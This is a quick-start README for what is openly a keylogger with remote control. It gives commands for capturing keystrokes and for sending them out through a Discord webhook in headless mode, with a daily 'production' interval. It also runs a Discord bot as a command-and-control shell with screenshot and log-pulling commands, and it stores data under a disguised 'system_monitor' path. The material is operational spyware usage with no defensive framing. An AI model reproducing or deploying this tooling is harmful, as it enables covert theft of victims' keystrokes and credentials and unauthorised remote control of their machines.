# Quick Start Guide

## Installation

```bash
pip install -r requirements.txt
```

## Test 1: Local Console

```bash
python main.py
```

See keystrokes in real-time.

## Test 2: Discord Webhook

```bash
# Setup webhook
python discord_setup.py

# Run with exfiltration (10 sec intervals for testing)
python main.py --webhook <YOUR_URL> --interval 10 --headless

# Or daily (production)
python main.py --webhook <YOUR_URL> --interval 86400 --headless
```

## Test 3: Discord Bot (C2 Shell)

```bash
# Start bot
python shell_client.py YOUR_BOT_TOKEN

# Send commands in Discord:
pwd              → Current directory
ls               → List files
whoami           → Current user
!info            → Status
!logs            → Show logs
!screenshot      → Capture screen
!help            → Help
```

## Test 4: Combined

```bash
# Terminal 1: Monitoring + webhook
python main.py --webhook <URL> --interval 600 --headless

# Terminal 2: Bot
python shell_client.py <BOT_TOKEN>
```

## Check Collected Data

```bash
ls ~/.config/system_monitor/logs/
cat ~/.config/system_monitor/logs/keystroke_*.json
```

**Full test guide:** See [TEST_GUIDE.md](TEST_GUIDE.md)
